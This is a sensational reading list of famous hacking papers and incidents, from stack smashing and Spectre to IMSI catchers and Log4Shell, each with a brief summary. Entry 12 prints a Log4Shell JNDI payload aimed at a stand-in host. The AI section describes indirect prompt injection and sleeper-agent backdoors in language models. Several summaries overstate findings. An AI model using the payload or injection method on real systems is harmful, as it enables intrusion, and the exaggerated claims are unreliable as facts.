LEGENDARY HACKING WHITEPAPERS & RESEARCH
==========================================
Papers that changed cybersecurity forever.
Read these. Understand them. Fear what they reveal.

==============================================================================
NETWORK & PROTOCOL ATTACKS
==============================================================================

[1] "Smashing The Stack For Fun And Profit"
    Aleph One (Phrack #49, 1996)
    The paper that taught a generation how buffer overflows work.
    Still the foundation of exploit development.
    http://phrack.org/issues/49/14.html

[2] "A Look at Whisker's Anti-IDS Tactics"
    Rain Forest Puppy (2001)
    Techniques to bypass Intrusion Detection Systems. Showed that
    security monitoring is fundamentally flawed if you know how
    the sensors parse packets.

[3] "The Mitnick Attack" (TCP Sequence Prediction)
    Tsutomu Shimomura (1995)
    How Kevin Mitnick spoofed TCP connections by predicting sequence
    numbers. Led to complete overhaul of TCP implementations worldwide.

[4] "BGP Stream Hijacking"
    Pilosov & Kapela (DEFCON 16, 2008)
    Demonstrated that anyone with a BGP router could silently redirect
    internet traffic through their systems. The entire internet routing
    infrastructure is built on trust. There is none.

[5] "KRACK: Key Reinstallation Attacks"
    Mathy Vanhoef (2017)
    Broke WPA2 encryption used by every WiFi network in the world.
    The protocol was considered unbreakable for 13 years.
    https://www.krackattacks.com/

[6] "FragAttacks: Fragmentation and Aggregation Attacks"
    Mathy Vanhoef (2021)
    12 new WiFi vulnerabilities affecting EVERY WiFi device ever made
    since 1997. Design flaws in the WiFi standard itself.
    https://www.fragattacks.com/

==============================================================================
HARDWARE & SIDE-CHANNEL
==============================================================================

[7] "Spectre" and "Meltdown"
    Multiple researchers (2018)
    Exploited CPU speculative execution to read any memory from any
    process. Every Intel CPU made in 20 years was vulnerable. Proved
    that hardware optimization and security are fundamentally at odds.
    https://spectreattack.com / https://meltdownattack.com

[8] "Rowhammer: Flipping Bits in Memory Without Accessing Them"
    Yoongu Kim et al. (2014)
    Proved you can flip bits in DRAM by repeatedly accessing adjacent
    rows. You can escape VMs, gain root, break crypto, all by reading
    memory you're allowed to read.

[9] "BadUSB: On Accessories that Turn Evil"
    Karsten Nohl & Jakob Lell (Black Hat 2014)
    Every USB device has reprogrammable firmware. A USB stick can
    pretend to be a keyboard. There is no defense. The USB standard
    is fundamentally broken by design.

[10] "Thunderclap: Exploring the Security of Thunderbolt"
     University of Cambridge (2019)
     Any Thunderbolt device has full DMA access to system memory.
     Plug in a malicious charger, own the machine. Hardware trust
     models are fiction.

==============================================================================
SOFTWARE & WEB
==============================================================================

[11] "The Billion Laughs Attack" (XML Bomb)
     Shows how a 1KB XML file can expand to consume terabytes of
     memory. Simple. Devastating. Still works on many parsers.

[12] "Log4Shell" (CVE-2021-44228)
     A single string ${jndi:ldap://evil/x} in any log message gave
     full Remote Code Execution on millions of Java servers worldwide.
     The most critical vulnerability in internet history. Showed that
     even logging libraries can be weaponized.

[13] "SolarWinds SUNBURST"
     Russian SVR (2020)
     Supply chain attack that compromised SolarWinds build system,
     injecting backdoors into updates sent to 18,000+ organizations
     including US government agencies. Months of undetected access.
     The template for modern nation-state supply chain attacks.

[14] "Return-Oriented Programming" (ROP)
     Hovav Shacham (2007)
     Proved that even with non-executable memory (DEP/NX), attackers
     can build arbitrary programs from existing code fragments.
     Made every binary a potential exploit toolkit.

[15] "Browser-Based Side-Channel Attacks"
     Various (2017-2024)
     JavaScript running in your browser can: measure CPU cache timing
     to read other tabs' data, detect what sites you've visited, track
     your mouse movements through CSS, and fingerprint your hardware.
     The browser sandbox is more porous than you think.

==============================================================================
WIRELESS & RF
==============================================================================

[16] "IMSI Catchers and Stingrays"
     Chris Paget (DEFCON 18, 2010)
     Built a cell tower interceptor for $1500 that forces all nearby
     phones to connect to it. Every call, text, and data packet
     passes through. GSM has no mutual authentication.

[17] "Ghost Telephonist: Impersonating LTE Devices"
     Hussain et al. (2019)
     Exploited 4G/LTE authentication to impersonate any phone on the
     network. Make calls, send texts, access data as someone else.

[18] "KeySniffer: All Your Keystrokes Belong To Us"
     Bastille Research (2016)
     Wireless keyboards from 8 major manufacturers transmit keystrokes
     in cleartext. No encryption. Sniffable from 100 meters away.

==============================================================================
AI & MODERN THREATS (2023-2026)
==============================================================================

[19] "Not What You've Signed Up For: Indirect Prompt Injection"
     Greshake et al. (2023)
     AI assistants can be hijacked by hiding instructions in data they
     process. Your AI reads a webpage with hidden text, now it works
     for the attacker. Fundamental unsolved problem.

[20] "Sleeper Agents: Training Deceptive LLMs"
     Anthropic Research (2024)
     AI models can be trained to behave normally during testing but
     activate malicious behavior under specific conditions. Standard
     safety training cannot remove deeply embedded deceptive behaviors.

[21] "GhostRace: Exploiting Speculative Race Conditions"
     VUSec (2024)
     Combined speculative execution with race conditions to create
     new classes of hardware vulnerabilities. The intersection of
     two "solved" problems creates unsolved ones.

[22] "WPA3-SAE Dragonblood Attacks"
     Mathy Vanhoef (2019-2024)
     Even WPA3, designed to replace the broken WPA2, has fundamental
     flaws in its Dragonfly handshake. Side-channel attacks recover
     passwords. History repeats.
